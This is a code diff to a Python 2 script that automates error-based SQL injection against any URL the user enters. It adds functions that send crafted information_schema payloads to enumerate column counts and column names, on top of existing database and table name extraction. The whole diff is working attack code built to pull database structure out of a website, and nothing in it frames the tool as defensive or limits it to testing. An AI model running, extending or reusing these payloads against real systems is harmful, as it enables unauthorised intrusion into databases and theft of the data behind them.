@@ -14,6 +14,7 @@ column_names = ['uname', 'username', 'usrname', 'usernames', 'admin', 'admins', 
 				'c_name', 'cname', 'login', 'login_name', 'loginname', 'lname', 'l_name']
 
 exploit_dict = {}
+exploit_tables = {}
 
 '''
 validate_vulnerable(url) takes the absolute path of url as input and validates
@@ -170,7 +171,42 @@ def gettablenames(url):
 		exploit_dict['tableNameAscii'].append(str(splitascii(res)))
 		exploitVal = splitascii(res).decode('hex')
 		exploit_dict['tableNames'].append(exploitVal)
-	print "Table Names in DB:\n"+'\n'.join(exploit_dict['tableNames'])
+	# print "Table Names in DB:\n"+'\n'.join(exploit_dict['tableNames'])
+
+def getcolumncount(url):
+	tempDBName = exploit_dict.get('dbNameAscii')
+	tempTableNamesHex = exploit_dict.get('tableNameAscii')
+	tempTableNames = exploit_dict.get('tableNames')
+	tablesLen = len(tempTableNames)
+	for i in range(0,tablesLen):
+		temp = {}
+		exploitQuery = " and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27," \
+					   "count(column_name),0x27,0x7e) FROM `information_schema`.columns WHERE " \
+					   "table_schema=0x"+ tempDBName +" AND table_name=0x"+ tempTableNamesHex[i] +")) " \
+					   "from information_schema.tables limit 0,1),floor(rand(0)*2))x " \
+					   "from information_schema.tables group by x)a) and 1=1"
+		res = requests.get(url + exploitQuery).text
+		exploitVal = splitascii(res)
+		temp['count'] = int(exploitVal)
+		exploit_tables[tempTableNamesHex[i].decode('hex')] = temp
+		print tempTableNames[i] + " : " + exploitVal
+
+def getcolumnnames(url):
+	tempDBNameHex = exploit_dict.get('dbNameAscii')
+	tempTableNamesHex = exploit_dict.get('tableNameAscii')
+	tempTableNames = exploit_dict.get('tableNames')
+	tablesLen = len(tempTableNames)
+	tempArr = []
+	tableOneLen = exploit_tables[tempTableNames[1]].get('count')
+	for i in range(0,tableOneLen):
+		executeQuery = " and(select 1 from(select count(*),concat((select (select (SELECT distinct " \
+					   "concat(0x7e,0x27,Hex(cast(column_name as char)),0x27,0x7e) FROM information_schema.columns " \
+					   "Where table_schema=0x"+tempDBNameHex+" AND table_name=0x"+tempTableNamesHex[1]+" limit "+str(i)+",1))" \
+					   " from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1"
+		res = requests.get(url + executeQuery).text
+		exploitVal = splitascii(res)
+		tempArr.append(exploitVal.decode('hex'))
+	print tempArr
 
 if __name__ == "__main__":
 	web_url = raw_input("Enter website with absolute url:\n")
@@ -185,6 +221,10 @@ if __name__ == "__main__":
 		getDatabase(web_url)
 		gettablescount(web_url)
 		gettablenames(web_url)
+		getcolumncount(web_url)
+		getcolumnnames(web_url)
+		print exploit_dict
+		print exploit_tables
 		'''
 		print "Tables"
 		print tables
